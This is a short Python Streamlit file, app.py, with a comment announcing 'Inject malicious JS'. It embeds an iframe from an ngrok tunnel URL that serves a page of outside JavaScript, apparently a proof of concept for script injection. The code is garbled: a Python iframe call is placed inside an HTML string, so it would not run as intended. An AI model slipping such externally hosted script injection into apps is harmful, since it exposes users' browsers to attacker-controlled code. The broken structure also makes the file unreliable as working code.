# app.py
import streamlit as st
import streamlit.components.v1 as components

# Inject malicious JS
components.html("""

            
components.iframe(
    "https://838c32416fd9.ngrok-free.app/page-with-js.html",
    height=600,
    scrolling=True
)
""", height=0) 